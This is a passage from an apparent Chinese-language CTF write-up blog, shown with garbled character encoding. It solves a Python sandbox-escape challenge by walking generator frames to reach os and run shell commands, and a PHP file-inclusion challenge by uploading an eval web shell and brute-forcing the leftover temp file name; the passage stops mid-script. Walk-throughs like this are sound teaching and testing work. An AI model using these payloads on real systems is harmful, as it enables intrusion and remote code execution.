class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œé€šè¿‡äº† <code>__builtins__</code> ä¸­çš„ <code>setattr</code>  ä¿®æ”¹äº† <code>os</code>  ä¸­çš„ <code>_exit</code>  ä¸º <code>print</code> ï¼Œé‚£ä¹ˆå°±ç®—è¢«é’©å­æ£€æµ‹åˆ°äº†ï¼Œä¹Ÿä¸ç”¨æ‹…å¿ƒè¢«ç›´æ¥é€€å‡ºäº†ï¼Œä¹‹åå°±æ˜¯ç›´æ¥ RCE äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line"><span class="comment">#root</span></span><br></pre></td></tr></table></figure><p>â€‹å› ä¸ºä¸èƒ½ä½¿ç”¨ <code>read()</code> ï¼ˆåœ¨å…³é”®è¯ä¸Šè¢«ç¦ç”¨äº†ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œåªæœ‰é€šè¿‡è¿™ç§æ–¹å¼è¿›è¡Œç»•è¿‡äº†ï¼Œé€šè¿‡ <code>getattr</code>  è·å– <code>popen</code>  æ‰§è¡Œè¿‡åçš„å¯¹è±¡ä¸­çš„ <code>_proc</code>  ä¹‹åç”¨ <code>stdout</code>  è¿›è¡Œè¾“å‡º</p><p>â€‹å…ˆè´´ä¸€ä¸ª payloadï¼Œæœ€å payload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå°±å¯¹è¿™ä¸ª payload å°±è¡Œä¸‹è®²è§£å°±è¡Œäº†ï¼Œå°±ä¸ä¸€æ­¥æ­¥è¿›è¡Œè°ƒè¯•äº†ï¼š</p><p>â€‹é¦–å…ˆï¼Œä¸‰ä¸ª waf å‡½æ•°é‡Œï¼Œç¬¬äºŒä¸ª waf ä½œç”¨ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯ä¼šå¯¼è‡´ <code>#é”™è¯¯: æ‰§è¡Œé”™è¯¯: Disallowed global access: q</code> ï¼Œä¸è¿‡åƒä¹‹åé‚£æ ·å°±ä¸ä¼šå‡ºç°è¿™ä¸ªæŠ¥é”™ã€‚ç¬¬ä¸€ä¸ªä¸»è¦æ˜¯æ¨æ‰äº†å¸¸è§çš„å­—æ®µï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯æ²™ç®±çš„æ ¸å¿ƒç‚¹ï¼Œè™½ç„¶çœ‹ä¸Šå»ç¬¬ä¸‰ä¸ª waf é˜²çš„å¾ˆæ­»ï¼Œä½†æ˜¯ç”¨å¤„ä¸å¤§ï¼Œå› ä¸ºæ˜¯ç”¨çš„ <code>os._exit()</code>  ç›´æ¥ exit æ‰äº†ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥ç»™ os é‡Œçš„è¿™ä¸ªæ–¹æ³•ç»™æ¨æ‰å°±è¡Œäº†ï¼Œä¸éœ€è¦åœ¨æ„ï¼Œæ‰€ä»¥è¿™é‡Œçš„ payload å°±æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    q = (q.gi_frame.f_back.f_back.f_back.f_back.f_globals <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    b=[*q][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span> <span class="keyword">in</span> b:</span><br><span class="line">        b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;set&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&quot;_ex&quot;</span>+<span class="string">&quot;it&quot;</span>, <span class="built_in">print</span>)</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">b=waff()</span><br><span class="line">o_modules = b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>]((b[<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;builtins&#x27;</span>+<span class="string">&#x27;_&#x27;</span>*<span class="number">2</span>][<span class="string">&#x27;get&#x27;</span>+<span class="string">&#x27;attr&#x27;</span>](b[<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>], <span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>)(<span class="string">&#x27;cat /aaaFffLllA44Ggg&#x27;</span>)),<span class="string">&quot;_proc&quot;</span>).stdout</span><br><span class="line"><span class="keyword">for</span> o_module <span class="keyword">in</span> o_modules:</span><br><span class="line">    <span class="built_in">print</span>(o_module)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè´´ä¸€ä¸‹ k13in å¤§ä½¬çš„ pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    x=(x.gi_frame.f_back <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">1</span>]); <span class="keyword">return</span> [*x][<span class="number">0</span>]</span><br><span class="line">fr=f(); k=<span class="string">&quot;\x6f\x73&quot;</span>.encode().decode(<span class="string">&quot;unicode_escape&quot;</span>); p=fr</span><br><span class="line"><span class="keyword">while</span> p:</span><br><span class="line">    g=p.f_globals</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> g:</span><br><span class="line">        o=g[k]</span><br><span class="line">        <span class="built_in">print</span>([e.name <span class="keyword">for</span> e <span class="keyword">in</span> o.scandir(<span class="string">&quot;/&quot;</span>)])</span><br><span class="line">        <span class="built_in">print</span>([e.name <span class="keyword">for</span> e <span class="keyword">in</span> o.scandir(<span class="string">&quot;/app&quot;</span>)])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p=p.f_back</span><br></pre></td></tr></table></figure><h2 id="ez_includeå¤ç°"><a class="markdownIt-Anchor" href="#ez_includeå¤ç°">#</a> <strong>ez_include</strong>ï¼ˆå¤ç°ï¼‰</h2><blockquote><p>ä¸å¤ªä¸€æ ·çš„æ–‡ä»¶åŒ…å«</p></blockquote><p>â€‹è´´ä¸ªæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span> === <span class="string">&#x27;tmp&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$tmpDir</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$tmpDir</span>) || !<span class="title function_ invoke__">is_readable</span>(<span class="variable">$tmpDir</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;/tmpç›®å½•ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$tmpDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$files</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æ— æ³•æ‰«æ/tmpç›®å½•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phpFiles</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$filename</span> !== <span class="string">&#x27;..&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="string">&#x27;php&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$phpFiles</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$phpFiles</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$phpFiles</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="variable">$lastFour</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">4</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">4</span>) : <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$lastFour</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¼ å…¥æœ‰æ•ˆçš„fileå‚æ•°&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAllowedFile</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filterPrefix</span> = <span class="string">&#x27;php://filter/string.strip_tags/resource=&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="variable">$filterPrefix</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$resourcePath</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$filterPrefix</span>));</span><br><span class="line">        <span class="variable">$resourceRealPath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$resourcePath</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resourceRealPath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpBaseDir</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;/tmp&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$allowedIndexPhp</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$resourceRealPath</span>, <span class="variable">$tmpBaseDir</span>) === <span class="number">0</span> || <span class="variable">$resourceRealPath</span> === <span class="variable">$allowedIndexPhp</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$realPath</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$realPath</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$tmpBaseDir</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;/tmp&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$realPath</span>, <span class="variable">$tmpBaseDir</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$allowedIndexPhp</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$realPath</span> === <span class="variable">$allowedIndexPhp</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">isAllowedFile</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fileå‚æ•°ä¸åˆæ³•&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$includeResult</span> = @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$includeResult</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br&gt;æ— æ³•åŒ…å«æ–‡ä»¶&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¯·ä¼ å…¥æœ‰æ•ˆçš„fileå‚æ•°</span><br></pre></td></tr></table></figure><p>â€‹å­˜åœ¨ <code>$filterPrefix = 'php://filter/string.strip_tags/resource=';</code> ï¼Œä¾ç¨€è®°å¾—<strong> BUUOJ-[NPUCTF2020] ezinclude 1</strong> è¿™ä¸ªé¢˜é‡Œæœ‰ä¸€ä¸ªè¿™ä¸ªä¼ªåè®®ï¼Œæœ‰ä¸ªç‰¹æ€§ï¼š</p><blockquote><p>åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œå¦‚æœå‡ºç°  <code>Segment Fault</code>  ï¼Œé‚£ä¹ˆä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ä¸ä¼šè¢«åˆ é™¤ã€‚è¿™é‡Œçš„ä¸Šä¼ æ–‡ä»¶éœ€è¦è¯´æ˜ä¸€ä¸‹ï¼Œä¸€èˆ¬è®¤ä¸ºï¼Œä¸Šä¼ æ–‡ä»¶éœ€è¦å¯¹åº”çš„åŠŸèƒ½ç‚¹ï¼Œä½†å®é™…ä¸Šï¼Œæ— è®ºæ˜¯å¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œåªè¦ HTTP è¯·æ±‚ä¸­å­˜åœ¨æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä¼šè¢«ä¿å­˜ä¸ºä¸´æ—¶æ–‡ä»¶ï¼Œå½“å‰ HTTP è¯·æ±‚å¤„ç†å®Œæˆåï¼Œåƒåœ¾å›æ”¶æœºåˆ¶ä¼šè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚</p><p>ä½¿  <code>php</code>  é™·å…¥æ­»å¾ªç¯ç›´ï¼Œäº§ç”Ÿ  <code>Segment Fault</code>  çš„æ–¹æ³•ï¼šï¼ˆå…·ä½“åŸç†æœªæ‰¾åˆ°ï¼Œå¦‚æœæœ‰å¤§ä½¬æ¸…æ¥šï¼Œè¯·å‘ŠçŸ¥ï¼Œæ„Ÿè°¢ã€‚ï¼‰</p><ul><li>ä½¿ç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php://filter/string.strip_tags/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;php://filter/convert.quoted-printable-encode/resource=æ–‡ä»¶</span><br></pre></td></tr></table></figure><ul><li>å‡½æ•°è¦æ±‚</li><li><code>file</code></li><li><code>file_get_contents</code></li><li><code>readfile</code></li></ul></blockquote><p>â€‹æ‰€ä»¥ç›´æ¥ PHP LFI åŒ…å«ä¸´æ—¶æ–‡ä»¶ï¼‹string.strip_tags è¿‡æ»¤å™¨å¯¼è‡´å‡ºç° php segment fault</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO <span class="comment">#BytesIOå®ç°äº†åœ¨å†…å­˜ä¸­è¯»å†™bytes</span></span><br><span class="line">payload = <span class="string">&quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27;file&#x27;</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">url=<span class="string">&quot;http://8.153.93.57:30372/?file=php://filter/string.strip_tags/resource=index.php&quot;</span></span><br><span class="line">r=requests.post(url=url,files=data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åç”¨ <code>?file=tmp</code> ï¼Œè¿™é‡ŒåŠŸèƒ½æ˜¯æ‰«æä¸´æ—¶æ–‡ä»¶ç›®å½•ï¼Œè¾“å‡º <code>DAyj</code> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$phpFiles</span> <span class="keyword">as</span> <span class="variable">$name</span>) &#123;</span><br><span class="line">    <span class="variable">$lastFour</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>) &gt;= <span class="number">4</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">4</span>) : <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$lastFour</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®è¿™é‡Œï¼Œå¯ä»¥çŸ¥é“ï¼Œå½“è¾“å‡ºé•¿åº¦é«˜äº 4 çš„æ—¶å€™è¾“å‡ºåå››ä½ï¼Œé‚£ä¹ˆï¼Œè¿™é‡Œåº”è¯¥æ˜¯ä¸¤ä½æ˜¯æœªçŸ¥çš„ <code>php??DAyj</code> ï¼Œé‚£ä¹ˆå°±å¾—çˆ†ç ´</p><p>â€‹æœ€åçˆ†ç ´å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡URLçš„åŸºç¡€éƒ¨åˆ†ï¼ˆ??ä¸ºå¾…çˆ†ç ´ä½ç½®ï¼‰</span></span><br><span class="line">base_url = <span class="string">&quot;http://8.153.93.57:30372/?file=/tmp/php&#123;&#125;&#123;&#125;DAyj&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´å­—ç¬¦é›†ï¼šæ•°å­— + 